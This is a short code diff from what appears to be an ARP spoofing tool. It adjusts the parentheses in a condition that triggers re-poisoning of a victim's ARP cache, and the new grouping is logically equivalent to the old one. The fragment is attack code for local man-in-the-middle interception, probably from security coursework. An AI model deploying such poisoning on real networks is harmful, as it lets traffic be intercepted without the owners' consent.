@@ -146,7 +146,7 @@ void infect(pcap_t* handle, Mac myMac, Mac senderMac, Ip senderIp, Ip targetIp){
 void reInfect(pcap_t* handle, const u_char* packet, Mac myMac,  Mac senderMac, Ip senderIp, Ip targetIp) {
    EthArpPacket request;
    memcpy(&request, packet, sizeof(EthArpPacket));
-   if((request.eth_.type() == EthHdr::Arp && request.arp_.op() == ArpHdr::Request && request.arp_.smac() == senderMac && request.arp_.tip() == targetIp) || (request.eth_.smac() == senderMac && request.eth_.dmac_.isBroadcast())) {
+   if((request.eth_.type() == EthHdr::Arp && request.arp_.op() == ArpHdr::Request) && (request.arp_.smac() == senderMac && request.arp_.tip() == targetIp) || (request.eth_.smac() == senderMac && request.eth_.dmac_.isBroadcast())) {
           printf("reinfect start\n");
           infect(handle, myMac, senderMac, senderIp, targetIp);
    }
